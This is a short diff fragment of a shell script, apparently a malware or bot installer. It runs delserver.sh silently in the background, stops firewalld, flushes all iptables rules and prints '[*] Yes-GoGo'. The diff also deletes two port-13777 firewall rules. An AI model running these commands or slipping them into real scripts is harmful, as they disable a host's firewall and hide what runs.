@@ -933,8 +933,6 @@ chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 
 systemctl stop firewalld.service
-iptables -A OUTPUT -p tcp --dport 13777 -j DROP
-iptables -A INPUT -p tcp --dport 13777 -j ACCEPT
 iptables -F
 
 echo "[*] Yes-GoGo"
